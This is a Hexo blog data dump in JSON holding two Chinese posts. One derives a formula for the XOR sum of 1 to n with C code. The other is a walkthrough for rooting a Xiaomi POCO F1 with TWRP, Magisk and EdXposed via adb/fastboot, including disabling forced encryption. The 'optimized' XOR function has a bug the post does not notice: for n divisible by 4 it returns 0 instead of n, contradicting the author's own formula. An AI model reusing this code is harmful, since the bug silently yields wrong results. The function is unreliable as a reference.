title=\"背景\"></a>背景</h2><p>异或（xor，运算符号<code>^</code>）：按位计算，同0异1，<code>1 ^ 0 = 1</code> ，<code>1 ^ 1 = 0</code> ，如此。</p>\n<p>现定义等差数列 <code>1, 2, ... , n</code> 的 <strong>异或和</strong> 为 <code>f(n) = 1 ^ 2 ^ ... ^ n</code> ，求f(n)的值。</p>\n<h2 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h2><p>我们很容易想到质朴的实现如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">func</span><span class=\"params\">(<span class=\"type\">int</span> n)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> xor_sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; ++i) &#123;</span><br><span class=\"line\">        xor_sum ^= i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> xor_sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>时间复杂度O(n)，空间复杂度此处没有太大必要讨论。</p>\n<h2 id=\"通式\"><a href=\"#通式\" class=\"headerlink\" title=\"通式\"></a>通式</h2><p>联想到等差数列的四则运算都是有求和公式的，那么异或运算有没有呢？直接这么看也看不出来，先输出个十来项看看规律：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> a[] = &#123;<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>, <span class=\"number\">16</span>, <span class=\"number\">17</span>, <span class=\"number\">18</span>&#125;;</span><br><span class=\"line\"><span class=\"comment\">// 1 3  0 4 1 7  0 8 1 11  0 12 1 15  0 16 1 19</span></span><br></pre></td></tr></table></figure>\n\n<p>注释中分别是从第1项到第18项的异或和。这个规律其实非常明显了，抛开前2个结果不看，后面4个为一组，定义为m组，通式如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// n=3, 0   n=7, 0      n=4m-1, 0</span></span><br><span class=\"line\"><span class=\"comment\">// n=4, 4   n=8, 8      n=4m, 4m</span></span><br><span class=\"line\"><span class=\"comment\">// n=5, 1   n=9, 1      n=4m+1, 1</span></span><br><span class=\"line\"><span class=\"comment\">// n=6, 7   n=10, 11    n=4m+2, 4m+3</span></span><br></pre></td></tr></table></figure>\n\n<p>从n&gt;&#x3D;3开始，后面的异或和的取值都是固定的常量或者公式求得。优化后实现如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">func</span><span class=\"params\">(<span class=\"type\">int</span> n)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (n) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">1</span>: <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">2</span>: <span class=\"keyword\">return</span> <span class=\"number\">3</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"type\">int</span> r = n % <span class=\"number\">4</span>;</span><br><span class=\"line\">            <span class=\"keyword\">switch</span> (r) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"number\">0</span>: <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"number\">1</span>: <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"number\">2</span>: <span class=\"keyword\">return</span> (n - <span class=\"number\">2</span>) + <span class=\"number\">3</span>;</span><br><span class=\"line\">                <span class=\"keyword\">default</span>: <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>时间复杂度O(1) ，部分代码为了体现公式没有精简，主要操作就是取余。</p>\n<p>这样能提升不少性能。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>异或（xor，运算符号<code>^</code>）：按位计算，同0异1，<code>1 ^ 0 = 1</code> ，<code>1 ^ 1 = 0</code> ，如此。</p>\n<p>现定义等差数列 <code>1, 2, ... , n</code> 的 <strong>异或和</strong> 为 <code>f(n) = 1 ^ 2 ^ ... ^ n</code> ，求f(n)的值。</p>\n<h2 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h2><p>我们很容易想到质朴的实现如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">func</span><span class=\"params\">(<span class=\"type\">int</span> n)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> xor_sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; ++i) &#123;</span><br><span class=\"line\">        xor_sum ^= i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> xor_sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>时间复杂度O(n)，空间复杂度此处没有太大必要讨论。</p>\n<h2 id=\"通式\"><a href=\"#通式\" class=\"headerlink\" title=\"通式\"></a>通式</h2><p>联想到等差数列的四则运算都是有求和公式的，那么异或运算有没有呢？直接这么看也看不出来，先输出个十来项看看规律：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> a[] = &#123;<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>, <span class=\"number\">16</span>, <span class=\"number\">17</span>, <span class=\"number\">18</span>&#125;;</span><br><span class=\"line\"><span class=\"comment\">// 1 3  0 4 1 7  0 8 1 11  0 12 1 15  0 16 1 19</span></span><br></pre></td></tr></table></figure>\n\n<p>注释中分别是从第1项到第18项的异或和。这个规律其实非常明显了，抛开前2个结果不看，后面4个为一组，定义为m组，通式如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// n=3, 0   n=7, 0      n=4m-1, 0</span></span><br><span class=\"line\"><span class=\"comment\">// n=4, 4   n=8, 8      n=4m, 4m</span></span><br><span class=\"line\"><span class=\"comment\">// n=5, 1   n=9, 1      n=4m+1, 1</span></span><br><span class=\"line\"><span class=\"comment\">// n=6, 7   n=10, 11    n=4m+2, 4m+3</span></span><br></pre></td></tr></table></figure>\n\n<p>从n&gt;&#x3D;3开始，后面的异或和的取值都是固定的常量或者公式求得。优化后实现如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">func</span><span class=\"params\">(<span class=\"type\">int</span> n)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (n) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">1</span>: <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">2</span>: <span class=\"keyword\">return</span> <span class=\"number\">3</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"type\">int</span> r = n % <span class=\"number\">4</span>;</span><br><span class=\"line\">            <span class=\"keyword\">switch</span> (r) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"number\">0</span>: <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"number\">1</span>: <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"number\">2</span>: <span class=\"keyword\">return</span> (n - <span class=\"number\">2</span>) + <span class=\"number\">3</span>;</span><br><span class=\"line\">                <span class=\"keyword\">default</span>: <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>时间复杂度O(1) ，部分代码为了体现公式没有精简，主要操作就是取余。</p>\n<p>这样能提升不少性能。</p>\n"},{"layout":"post","title":"Magisk与EdXposed框架安装实践（Android P及以上）","subtitle":"鼓捣鼓捣。","date":"2020-07-03T16:00:00.000Z","author":"YSY","header-img":"img/archive-bg.jpg","catalog":true,"_content":"\n记得初中的时候还在用Android 2.3，高中开始刷机，每个月都去追论坛大佬的自定义精简ROM，不亦乐乎，这一晃都过了快十年了。从以前旧版Android（支持到8.x）的Xposed到现在的EdXposed、Magisk等玩机框架，大佬些的脚步从未停歇。模块开发生态也好了很多（得益于Github及各种文档）。不过由于现在ROM厂商越来越深度的定制和限制（当然也是考虑到普通用户的安全），ROOT起来也麻烦了不少。\n\n其实我自从以前用Android 4.x时搞过机，后来也很久没接触这些了。最近把手边的测试机器（小米POCO F1，骁龙845，Android 10、MIUI 12）拿来搞了搞，发现操作过程也不是很麻烦，本文就仅作记录吧，方便以后查阅，毕竟各种链接每次都临时搜还是很费事。\n\n## Xposed\n\n由于现在Android新版本的普及，新上市的手机基本都是8.0以上了。所以以前的Xposed框架已经不适用。EdXposed团队成为了后续版本研发的继任者，从[Xpsoed的wikipedia](https://zh.wikipedia.org/zh-hans/Xposed_(框架))中可以查到交接历史：\n\n> 2017年7月，abforce在GitHub上发布了支持Nougat的xposed，不过此发布需在编译ROM前集成在源码中而不是以前直接卡刷的形式。\n> 2017年10月，Xposed框架开始支持。[[3\\]](https://zh.wikipedia.org/zh-hans/Xposed_(框架)#cite_note-3)\n> 2019年1月，ElderDrivers完成了[EdXposed](https://github.com/ElderDrivers/EdXposed)的开发。EdXp是一个Magisk模块，依赖于[riru](https://github.com/RikkaApps/Riru)框架，成功将Xposed移植到了Android Pie上，成为最接近原版Xposed的框架。\n> 2019年9月，[EdXposed](https://github.com/ElderDrivers/EdXposed)正式支持Android Q。\n> 2020年1月，[EdXposed](https://github.com/ElderDrivers/EdXposed)与Xposed原开发团队达成共识，成为Xposed停止更新后的官方接任者。\n\n当然，我们依然可以下载官方的资源来进行刷机：[https://repo.xposed.info/module/de.robv.android.xposed.installer](https://repo.xposed.info/module/de.robv.android.xposed.installer)，不过这不是本文重点。\n\n## TWRP Recovery、Magisk、EdXposed\n\n由于我的测试机是Android 10，所以要刷EdXposed。大致思路很简单，也是最容易成功的步骤：先刷三方Rec（这里是TWRP），然后装Magisk，最后通过Magisk装EdXposed。\n\n在开始介绍步骤之前，我想说其实 [https://magisk.me/](https://magisk.me/) 是有热门刷机机型ROOT教程的，比起那些乱七八糟的二手资料要好很多，不过里面博客中的各种下载链接都打不开，后来我找到了替代的网站 [https://www.androidjungles.com/](https://www.androidjungles.com/)。本文所有下载链接都尽可能地提供官方原地址，保证权威有效（文末也会提供所有相关文件的网盘备份）。\n\n**下面开始：**\n\n0、这里默认电脑已经安装好 `adb`、`fastboot` 命令工具。\n\n1、各机型对应的Recovery很可能是不同的，先找自己设备对应的下载：[https://twrp.me/Devices/](https://twrp.me/Devices/) ，比如我这里的机型打开后是这样：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200703235449500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n我们点Download Links中的链接，2选1即可，反正不管美洲还是欧洲速度都很慢。进去后选最新版本的img文件，再点进去进行下载。我这里最后下载下来是：[twrp-3.3.0-0-beryllium.img](https://dl.twrp.me/beryllium/twrp-3.3.0-0-beryllium.img) ，下载完后我们把它重命名成 `recovery.img` ，后面有用。\n\n2、下载 [Disable-Force-Encryption-Treble.zip](https://drive.google.com/file/d/1As6z5v7NEIfOk67jXHBX34cbnFZdEjy9/view) ，后面在Rec中要用到，**不过这个和机型有关，部分机型可能不需要**，具体可查看 [https://magisk.me/](https://magisk.me/) 中的教程。\n\n3、到Magisk的官方下载页面下载最新的Zip和Apk：[https://www.download-magisk.com](https://www.download-magisk.com) ，最终资源文件其实都在Github仓库中。我这里对应要下载的就是：\n\n- [Magisk-v20.4.zip](https://github.com/topjohnwu/Magisk/releases/download/v20.4/Magisk-v20.4.zip)\n- [MagiskManager-v7.5.1.apk](https://github.com/topjohnwu/Magisk/releases/download/manager-v7.5.1/MagiskManager-v7.5.1.apk)\n\n4、上面下载好的两个zip都拷贝到手机里，然后打开终端，开始搞事情：\n\n```bash\n# 手机电脑连起来，先重启手机进入fastboot模式，命令和手动均可\nadb reboot bootloader\n# 然后把刚才下载并重命名好的img刷入\nfastboot flash recovery recovery.img\n# 执行完此就会自动进入Recovery模式\nfastboot boot recovery.img\n```\n\n5、（无需安装这个zip的机型可忽略这一步）进入Rec后，可能第一次会有提示，点选 **Keep Read Only** ，然后在主界面点 **Install** ，选择刚才下载的 **DisableForceEncryption_Treble.zip** ，右滑Swipe安装。安装完后别急着点Reboot System，为了方便，按**返回键**到主界面中点击 **Reboot** ，选 **Recovery** 重启后自动进入Rec模式。\n\n6、再次进入Rec，还是点Install，然后选刚才下载的Magisk-xxx.zip，进行安装（操作图文可见官方：[https://www.download-magisk.com](https://www.download-magisk.com)）。完事直接点Reboot System重启进入系统即可。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200704004046689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n7、不出意外，进入系统后，桌面上就会出现 **Magisk Manager** 的图标（这里请忽略EdXposed，那是后续手动装的），说明安装成功（所以刚才下载的Apk并没有太大用哈哈，当然可以覆盖安装一下保证版本最新）。打开Manager应该可以看到两项都安装成功了。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200704004304427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n8、后面就简单了，参考EdXposed官方文档（[https://github.com/ElderDrivers/EdXposed](https://github.com/ElderDrivers/EdXposed)）的Install步骤即可：\n\n- 在Magisk Manager的“下载”中安装 Riru（Riru - Core）和 Riru - EdXposed 后重启手机。\n- 去 [https://github.com/ElderDrivers/EdXposedManager/releases](https://github.com/ElderDrivers/EdXposedManager/releases) 下载EdXposed Manager的Apk来安装。大功告成！\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200704012136271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n## 其他\n\n- img文件重命名为recovery目的是为了覆盖系统原有的recovery，这样在用音量键上+电源键时可以手动进入到TWRP Rec。\n- 建议全程保证网络能访问谷歌（你懂的），包括手机和电脑。否则，Manager中可能会出现一直在检查更新和模块列表加载不出来也下载安装不了的情况。\n- 在上述第6步进行Magisk安装之前，某些教程会提到在Rec中 **Wipe** > **Format data** 来清除手机数据后再安装，注意如果你选择了清除数据，之前拷贝到手机中的zip文件会消失，你需要重启进系统再拷贝一次才行，比较麻烦，所以我没做清除的操作，貌似也没什么问题。\n- 文件备份链接：https://pan.baidu.com/s/1csL1XgWn9O4HN4E8zLXq2A  密码：13av\n","source":"_posts/2020-07-04-Magisk与EdXposed框架安装实践（Android P及以上） .md","raw":"---\nlayout:     post\ntitle:      Magisk与EdXposed框架安装实践（Android P及以上）\nsubtitle:   鼓捣鼓捣。\ndate:       2020-07-04\nauthor:     YSY\nheader-img: img/archive-bg.jpg\ncatalog: true\ntags:\n    - 鼓捣折腾\n    - Android\n---\n\n记得初中的时候还在用Android 2.3，高中开始刷机，每个月都去追论坛大佬的自定义精简ROM，不亦乐乎，这一晃都过了快十年了。从以前旧版Android（支持到8.x）的Xposed到现在的EdXposed、Magisk等玩机框架，大佬些的脚步从未停歇。模块开发生态也好了很多（得益于Github及各种文档）。不过由于现在ROM厂商越来越深度的定制和限制（当然也是考虑到普通用户的安全），ROOT起来也麻烦了不少。\n\n其实我自从以前用Android 4.x时搞过机，后来也很久没接触这些了。最近把手边的测试机器（小米POCO F1，骁龙845，Android 10、MIUI 12）拿来搞了搞，发现操作过程也不是很麻烦，本文就仅作记录吧，方便以后查阅，毕竟各种链接每次都临时搜还是很费事。\n\n## Xposed\n\n由于现在Android新版本的普及，新上市的手机基本都是8.0以上了。所以以前的Xposed框架已经不适用。EdXposed团队成为了后续版本研发的继任者，从[Xpsoed的wikipedia](https://zh.wikipedia.org/zh-hans/Xposed_(框架))中可以查到交接历史：\n\n> 2017年7月，abforce在GitHub上发布了支持Nougat的xposed，不过此发布需在编译ROM前集成在源码中而不是以前直接卡刷的形式。\n> 2017年10月，Xposed框架开始支持。[[3\\]](https://zh.wikipedia.org/zh-hans/Xposed_(框架)#cite_note-3)\n> 2019年1月，ElderDrivers完成了[EdXposed](https://github.com/ElderDrivers/EdXposed)的开发。EdXp是一个Magisk模块，依赖于[riru](https://github.com/RikkaApps/Riru)框架，成功将Xposed移植到了Android Pie上，成为最接近原版Xposed的框架。\n> 2019年9月，[EdXposed](https://github.com/ElderDrivers/EdXposed)正式支持Android Q。\n> 2020年1月，[EdXposed](https://github.com/ElderDrivers/EdXposed)与Xposed原开发团队达成共识，成为Xposed停止更新后的官方接任者。\n\n当然，我们依然可以下载官方的资源来进行刷机：[https://repo.xposed.info/module/de.robv.android.xposed.installer](https://repo.xposed.info/module/de.robv.android.xposed.installer)，不过这不是本文重点。\n\n## TWRP Recovery、Magisk、EdXposed\n\n由于我的测试机是Android 10，所以要刷EdXposed。大致思路很简单，也是最容易成功的步骤：先刷三方Rec（这里是TWRP），然后装Magisk，最后通过Magisk装EdXposed。\n\n在开始介绍步骤之前，我想说其实 [https://magisk.me/](https://magisk.me/) 是有热门刷机机型ROOT教程的，比起那些乱七八糟的二手资料要好很多，不过里面博客中的各种下载链接都打不开，后来我找到了替代的网站 [https://www.androidjungles.com/](https://www.androidjungles.com/)。本文所有下载链接都尽可能地提供官方原地址，保证权威有效（文末也会提供所有相关文件的网盘备份）。\n\n**下面开始：**\n\n0、这里默认电脑已经安装好 `adb`、`fastboot` 命令工具。\n\n1、各机型对应的Recovery很可能是不同的，先找自己设备对应的下载：[https://twrp.me/Devices/](https://twrp.me/Devices/) ，比如我这里的机型打开后是这样：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200703235449500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n我们点Download Links中的链接，2选1即可，反正不管美洲还是欧洲速度都很慢。进去后选最新版本的img文件，再点进去进行下载。我这里最后下载下来是：[twrp-3.3.0-0-beryllium.img](https://dl.twrp.me/beryllium/twrp-3.3.0-0-beryllium.img) ，下载完后我们把它重命名成 `recovery.img` ，后面有用。\n\n2、下载 [Disable-Force-Encryption-Treble.zip](https://drive.google.com/file/d/1As6z5v7NEIfOk67jXHBX34cbnFZdEjy9/view) ，后面在Rec中要用到，**不过这个和机型有关，部分机型可能不需要**，具体可查看 [https://magisk.me/](https://magisk.me/) 中的教程。\n\n3、到Magisk的官方下载页面下载最新的Zip和Apk：[https://www.download-magisk.com](https://www.download-magisk.com) ，最终资源文件其实都在Github仓库中。我这里对应要下载的就是：\n\n- [Magisk-v20.4.zip](https://github.com/topjohnwu/Magisk/releases/download/v20.4/Magisk-v20.4.zip)\n- [MagiskManager-v7.5.1.apk](https://github.com/topjohnwu/Magisk/releases/download/manager-v7.5.1/MagiskManager-v7.5.1.apk)\n\n4、上面下载好的两个zip都拷贝到手机里，然后打开终端，开始搞事情：\n\n```bash\n# 手机电脑连起来，先重启手机进入fastboot模式，命令和手动均可\nadb reboot bootloader\n# 然后把刚才下载并重命名好的img刷入\nfastboot flash recovery recovery.img\n# 执行完此就会自动进入Recovery模式\nfastboot boot recovery.img\n```\n\n5、（无需安装这个zip的机型可忽略这一步）进入Rec后，可能第一次会有提示，点选 **Keep Read Only** ，然后在主界面点 **Install** ，选择刚才下载的 **DisableForceEncryption_Treble.zip** ，右滑Swipe安装。安装完后别急着点Reboot System，为了方便，按**返回键**到主界面中点击 **Reboot** ，选 **Recovery** 重启后自动进入Rec模式。\n\n6、再次进入Rec，还是点Install，然后选刚才下载的Magisk-xxx.zip，进行安装（操作图文可见官方：[https://www.download-magisk.com](https://www.download-magisk.com)）。完事直接点Reboot System重启进入系统即可。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200704004046689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n7、不出意外，进入系统后，桌面上就会出现 **Magisk Manager** 的图标（这里请忽略EdXposed，那是后续手动装的），说明安装成功（所以刚才下载的Apk并没有太大用哈哈，当然可以覆盖安装一下保证版本最新）。打开Manager应该可以看到两项都安装成功了。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200704004304427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n8、后面就简单了，参考EdXposed官方文档（[https://github.com/ElderDrivers/EdXposed](https://github.com/ElderDrivers/EdXposed)）的Install步骤即可：\n\n- 在Magisk Manager的“下载”中安装 Riru（Riru - Core）和 Riru - EdXposed 后重启手机。\n- 去 [https://github.com/ElderDrivers/EdXposedManager/releases](https://github.com/ElderDrivers/EdXposedManager/releases) 下载EdXposed Manager的Apk来安装。大功告成！\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200704012136271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n## 其他\n\n- img文件重命名为recovery目的是为了覆盖系统原有的recovery，这样在用音量键上+电源键时可以手动进入到TWRP Rec。\n- 建议全程保证网络能访问谷歌（你懂的），包括手机和电脑。否则，Manager中可能会出现一直在检查更新和模块列表加载不出来也下载安装不了的情况。\n- 在上述第6步进行Magisk安装之前，某些教程会提到在Rec中 **Wipe** > **Format data** 来清除手机数据后再安装，注意如果你选择了清除数据，之前拷贝到手机中的zip文件会消失，你需要重启进系统再拷贝一次才行，比较麻烦，所以我没做清除的操作，貌似也没什么问题。\n- 文件备份链接：https://pan.baidu.com/s/1csL1XgWn9O4HN4E8zLXq2A  密码：13av\n","slug":"Magisk与EdXposed框架安装实践（Android P及以上） ","published":1,"updated":"2024-03-25T07:31:25.863Z","comments":1,"photos":[],"link":"","_id":"cluaufh140033the6cc706zxc","content":"<p>记得初中的时候还在用Android 2.3，高中开始刷机，每个月都去追论坛大佬的自定义精简ROM，不亦乐乎，这一晃都过了快十年了。从以前旧版Android（支持到8.x）的Xposed到现在的EdXposed、Magisk等玩机框架，大佬些的脚步从未停歇。模块开发生态也好了很多（得益于Github及各种文档）。不过由于现在ROM厂商越来越深度的定制和限制（当然也是考虑到普通用户的安全），ROOT起来也麻烦了不少。</p>\n<p>其实我自从以前用Android 4.x时搞过机，后来也很久没接触这些了。最近把手边的测试机器（小米POCO F1，骁龙845，Android 10、MIUI 12）拿来搞了搞，发现操作过程也不是很麻烦，本文就仅作记录吧，方便以后查阅，毕竟各种链接每次都临时搜还是很费事。</p>\n<h2 id=\"Xposed\"><a href=\"#Xposed\" class=\"headerlink\" title=\"Xposed\"></a>Xposed</h2><p>由于现在Android新版本的普及，新上市的手机基本都是8.0以上了。所以以前的Xposed框架已经不适用。EdXposed团队成为了后续版本研发的继任者，从<a href=\"https://zh.wikipedia.org/zh-hans/Xposed_(%E6%A1%86%E6%9E%B6)\">Xpsoed的wikipedia</a>中可以查到交接历史：</p>\n<blockquote>\n<p>2017年7月，abforce在GitHub上发布了支持Nougat的xposed，不过此发布需在编译ROM前集成在源码中而不是以前直接卡刷的形式。<br>2017年10月，Xposed框架开始支持。[<a href=\"https://zh.wikipedia.org/zh-hans/Xposed_(%E6%A1%86%E6%9E%B6)#cite_note-3\">3]</a><br>2019年1月，ElderDrivers完成了<a href=\"https://github.com/ElderDrivers/EdXposed\">EdXposed</a>的开发。EdXp是一个Magisk模块，依赖于<a href=\"https://github.com/RikkaApps/Riru\">riru</a>框架，成功将Xposed移植到了Android Pie上，成为最接近原版Xposed的框架。<br>2019年9月，<a href=\"https://github.com/ElderDrivers/EdXposed\">EdXposed</a>正式支持Android Q。<br>2020年1月，<a href=\"https://github.com/ElderDrivers/EdXposed\">EdXposed</a>与Xposed原开发团队达成共识，成为Xposed停止更新后的官方接任者。</p>\n</blockquote>\n<p>当然，我们依然可以下载官方的资源来进行刷机：<a href=\"https://repo.xposed.info/module/de.robv.android.xposed.installer\">https://repo.xposed.info/module/de.robv.android.xposed.installer</a>，不过这不是本文重点。</p>\n<h2 id=\"TWRP-Recovery、Magisk、EdXposed\"><a href=\"#TWRP-Recovery、Magisk、EdXposed\" class=\"headerlink\" title=\"TWRP Recovery、Magisk、EdXposed\"></a>TWRP Recovery、Magisk、EdXposed</h2><p>由于我的测试机是Android 10，所以要刷EdXposed。大致思路很简单，也是最容易成功的步骤：先刷三方Rec（这里是TWRP），然后装Magisk，最后通过Magisk装EdXposed。</p>\n<p>在开始介绍步骤之前，我想说其实 <a href=\"https://magisk.me/\">https://magisk.me/</a> 是有热门刷机机型ROOT教程的，比起那些乱七八糟的二手资料要好很多，不过里面博客中的各种下载链接都打不开，后来我找到了替代的网站 <a href=\"https://www.androidjungles.com/\">https://www.androidjungles.com/</a>。本文所有下载链接都尽可能地提供官方原地址，保证权威有效（文末也会提供所有相关文件的网盘备份）。</p>\n<p><strong>下面开始：</strong></p>\n<p>0、这里默认电脑已经安装好 